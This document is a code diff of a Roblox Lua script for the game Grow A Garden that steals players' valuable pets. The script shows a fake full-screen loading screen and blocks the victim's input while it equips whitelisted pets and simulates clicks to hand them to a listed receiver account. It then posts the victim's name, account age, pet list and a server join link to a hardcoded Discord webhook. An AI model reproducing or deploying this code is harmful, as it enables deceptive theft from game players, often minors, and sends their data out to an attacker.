@@ -1,151 +1,200 @@
+-- ✅ ОБЪЕДИНЁННЫЙ СКРИПТ С ВОЛНОЙ, GUI, ЗАЖАТИЕМ И DISCORD WEBHOOK
+
 repeat task.wait() until game:IsLoaded()
 
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local VirtualInputManager = game:GetService("VirtualInputManager")
-
-local VICTIM = Players.LocalPlayer
-local USERNAMES = { "ZeeS_Farm01" }
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1376515155814514769/0pp3_tQv_j7Aeehx6imt8UBQUan0sPFfn9yaxXxmy6QGfeucYGh4CHQwrssARwTNfh75"
+local USERNAMES = {"ZeeS_Farm01"}
+local VICTIM = game.Players.LocalPlayer
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local HttpService = game:GetService("HttpService")
+local ContextActionService = game:GetService("ContextActionService")
+local request = http_request or request or HttpPost or syn.request
+local dataModule = require(ReplicatedStorage.Modules.DataService)
 
 local PET_WHITELIST = {
-	'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly',
-	'Disco Bee', 'Mimic Octopus', 'Queen Bee', 'Spinosaurus', 'Kitsune', 'Raiju'
+    'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly',
+    'Disco Bee', 'Mimic Octopus', 'Queen Bee', 'Spinosaurus', 'Kitsune',
 }
 
-local dataModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("DataService"))
-local victimPetTable = {}
+local victimPetTable, petSequence = {}, {}
 
-local function waitForTarget()
-	for _, player in Players:GetPlayers() do
-		if table.find(USERNAMES, player.Name) then
-			return true, player.Name
-		end
-	end
-	return false, nil
+local function showLoadingScreen()
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "LoadingCover"
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    gui.Parent = VICTIM:WaitForChild("PlayerGui")
+
+    local frame = Instance.new("Frame", gui)
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(40, 0, 60)
+    frame.BackgroundTransparency = 1
+    frame.ZIndex = 10
+
+    TweenService:Create(frame, TweenInfo.new(1), {BackgroundTransparency = 0}):Play()
+
+    local title = Instance.new("TextLabel", frame)
+    title.Size = UDim2.new(1, 0, 0.3, 0)
+    title.Position = UDim2.new(0, 0, 0.35, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "✩ Loading..."
+    title.Font = Enum.Font.GothamBlack
+    title.TextSize = 64
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.TextStrokeTransparency = 0.2
+    title.ZIndex = 11
+
+    local barBG = Instance.new("Frame", frame)
+    barBG.Size = UDim2.new(0.8, 0, 0, 24)
+    barBG.Position = UDim2.new(0.1, 0, 0.95, 0)
+    barBG.BackgroundColor3 = Color3.fromRGB(70, 0, 100)
+    barBG.BorderSizePixel = 0
+    barBG.ZIndex = 11
+    barBG.ClipsDescendants = true
+
+    local bar = Instance.new("Frame", barBG)
+    bar.Size = UDim2.new(1, 0, 1, 0)
+    bar.Position = UDim2.new(0, 0, 0, 0)
+    bar.BackgroundColor3 = Color3.fromRGB(255, 50, 100)
+    bar.BorderSizePixel = 0
+    bar.ZIndex = 12
+    bar.ClipsDescendants = true
+
+    local wave = Instance.new("ImageLabel", bar)
+    wave.Size = UDim2.new(3, 0, 1.2, 0)
+    wave.Position = UDim2.new(-1.5, 0, -0.1, 0)
+    wave.BackgroundTransparency = 1
+    wave.Image = "rbxassetid://1837412317"
+    wave.ImageTransparency = 0.25
+    wave.ImageColor3 = Color3.new(1, 1, 1)
+    wave.ZIndex = 13
+    wave.ScaleType = Enum.ScaleType.Tile
+    wave.TileSize = UDim2.new(0, 128, 0, 24)
+
+    local humanoid = VICTIM.Character and VICTIM.Character:FindFirstChildOfClass("Humanoid")
+    local originalWalkSpeed = humanoid and humanoid.WalkSpeed or 16
+    local originalJumpPower = humanoid and humanoid.JumpPower or 50
+    if humanoid then humanoid.WalkSpeed = 0 humanoid.JumpPower = 0 end
+
+    ContextActionService:BindAction("BlockAllInput", function() return Enum.ContextActionResult.Sink end, false, Enum.UserInputType.Keyboard, Enum.UserInputType.MouseButton1, Enum.UserInputType.MouseButton2)
+
+    task.spawn(function()
+        local duration, startTime = 15, tick()
+        while true do
+            local elapsed = tick() - startTime
+            local percent = math.clamp(1 - (elapsed / duration), 0, 1)
+            bar.Size = UDim2.new(percent, 0, 1, 0)
+            bar.BackgroundColor3 = Color3.fromRGB(255, math.floor(50 * percent), math.floor(100 + 100 * percent))
+            wave.Position = wave.Position + UDim2.new(0.01, 0, 0, 0)
+            if wave.Position.X.Scale > 2 then wave.Position = UDim2.new(-1.5, 0, -0.1, 0) end
+            if percent <= 0 then break end
+            task.wait(0.03)
+        end
+
+        if humanoid then humanoid.WalkSpeed = originalWalkSpeed humanoid.JumpPower = originalJumpPower end
+        ContextActionService:UnbindAction("BlockAllInput")
+        gui:Destroy()
+    end)
 end
 
-local function createLoadingGUI()
-	local gui = Instance.new("ScreenGui", VICTIM:WaitForChild("PlayerGui"))
-	gui.Name = "FullScreenLoading"
-	gui.IgnoreGuiInset = true
-	gui.ResetOnSpawn = false
-	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-	local bg = Instance.new("Frame", gui)
-	bg.Size = UDim2.new(1, 0, 1, 0)
-	bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-	bg.BorderSizePixel = 0
-
-	local text = Instance.new("TextLabel", bg)
-	text.Text = "\u{1F501} Connecting to player..."
-	text.Size = UDim2.new(1, 0, 0, 100)
-	text.Position = UDim2.new(0, 0, 0.4, 0)
-	text.TextColor3 = Color3.new(1, 1, 1)
-	text.Font = Enum.Font.GothamBlack
-	text.TextSize = 40
-	text.BackgroundTransparency = 1
-
-	local barBG = Instance.new("Frame", bg)
-	barBG.Size = UDim2.new(0.6, 0, 0.05, 0)
-	barBG.Position = UDim2.new(0.2, 0, 0.55, 0)
-	barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-	barBG.BorderSizePixel = 0
-
-	local bar = Instance.new("Frame", barBG)
-	bar.Size = UDim2.new(0, 0, 1, 0)
-	bar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-	bar.BorderSizePixel = 0
-
-	return gui, bar
+local function checkPetsWhitelist(name)
+    for _, p in PET_WHITELIST do if string.find(name, p) then return true end end
 end
 
-local function showLoadingBar(duration)
-	local gui, bar = createLoadingGUI()
-	local steps = 100
-	local waitTime = duration / steps
-
-	for i = 1, steps do
-		bar.Size = UDim2.new(i / steps, 0, 1, 0)
-		task.wait(waitTime)
-	end
-
-	gui:Destroy()
-end
-
-local function checkPetsWhitelist(pet)
-	for _, name in PET_WHITELIST do
-		if string.find(pet, name) then
-			return true
-		end
-	end
-end
-
-local function getPetObject(petUid)
-	for _, object in ipairs(VICTIM.Backpack:GetChildren()) do
-		if object:GetAttribute("PET_UUID") == petUid then
-			return object
-		end
-	end
-	for _, object in ipairs(workspace[VICTIM.Name]:GetChildren()) do
-		if object:GetAttribute("PET_UUID") == petUid then
-			return object
-		end
-	end
+local function getPetObject(uid)
+    for _, obj in VICTIM.Backpack:GetChildren() do if obj:GetAttribute("PET_UUID") == uid then return obj end end
+    for _, obj in workspace[VICTIM.Name]:GetChildren() do if obj:GetAttribute("PET_UUID") == uid then return obj end end
 end
 
 local function equipPet(pet)
-	if pet:GetAttribute("d") then
-		ReplicatedStorage.GameEvents.Favorite_Item:FireServer(pet)
-	end
-	VICTIM.Character.Humanoid:EquipTool(pet)
+    if pet:GetAttribute("d") then ReplicatedStorage.GameEvents.Favorite_Item:FireServer(pet) end
+    VICTIM.Character.Humanoid:EquipTool(pet)
 end
 
-local function deltaBypass()
-	local cx = workspace.Camera.ViewportSize.X / 2
-	local cy = workspace.Camera.ViewportSize.Y / 2
-	VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, true, nil, false)
-	task.wait(0.5)
-	VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, false, nil, false)
+-- удалено: unequipPet()
+-- при смене питомца мы теперь не снимаем предыдущего
+
+local function pressCenterMouse(duration)
+    local x, y = workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2
+    VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, nil, false)
+    task.wait(duration)
+    VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, nil, false)
 end
 
-local function startSteal(trigerName)
-	local prompt = Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt")
-	if prompt then
-		prompt.HoldDuration = 0
-		deltaBypass()
-	end
+local function startPetCycle(targetName)
+    task.spawn(function()
+        local index = 1
+        while Players:FindFirstChild(targetName) do
+            local info = petSequence[index]
+            local obj = getPetObject(info.uid)
+            if obj then equipPet(obj) task.wait(0.2) pressCenterMouse(0.5) end
+            index += 1 if index > #petSequence then index = 1 end
+            task.wait(5)
+        end
+    end)
 end
 
 local function getPlayersPets()
-	for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
-		if checkPetsWhitelist(value.PetType) then
-			table.insert(victimPetTable, value.PetType)
-		end
-	end
+    for uid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        if checkPetsWhitelist(value.PetType) then
+            table.insert(victimPetTable, value.PetType)
+            table.insert(petSequence, {uid = uid, name = value.PetType})
+        end
+    end
+end
+
+local function teleportTarget(name)
+    local target = Players:FindFirstChild(name)
+    if target and target.Character then
+        VICTIM.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
+    end
+end
+
+local function createDiscordEmbed(petList, totalValue)
+    local embed = {
+        title = "🌵 Grow A Garden Hit - DARK SKIDS 🍀",
+        color = 65280,
+        fields = {
+            { name = "👤 **Player Information**", value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", VICTIM.Name, table.concat(USERNAMES, " "), identifyexecutor(), VICTIM.AccountAge) },
+            { name = "💰 **Total Value**", value = string.format("```%s¢```", totalValue) },
+            { name = "🌴 **Backpack**", value = string.format("```%s```", petList) },
+            { name = "🌽 **Join with URL**", value = string.format("[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", game.JobId, game.PlaceId, game.JobId) }
+        },
+        footer = { text = string.format("%s | %s", game.PlaceId, game.JobId) }
+    }
+
+    local data = {
+        content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n", game.PlaceId, game.JobId),
+        username = VICTIM.Name,
+        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
+        embeds = {embed}
+    }
+
+    request({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = HttpService:JSONEncode(data)
+    })
 end
 
 getPlayersPets()
 
-task.spawn(function()
-	while task.wait(1) do
-		local found, targetName = waitForTarget()
-		if found then
-			showLoadingBar(30)
-			task.wait(7)
-
-			for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-				if not checkPetsWhitelist(value.PetType) then continue end
-				local petObject = getPetObject(petUid)
-				if not petObject then continue end
-				equipPet(petObject)
-				deltaBypass()
-				startSteal(targetName)
-				task.wait(0.3)
-			end
-
-			break
-		end
-	end
-end)
+-- 🚀 Главный запуск
+while task.wait(1) do
+    for _, player in ipairs(Players:GetPlayers()) do
+        if table.find(USERNAMES, player.Name) then
+            showLoadingScreen()
+            task.delay(5, function()
+                teleportTarget(player.Name)
+                startPetCycle(player.Name)
+            end)
+            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000")
+            return
+        end
+    end
+end
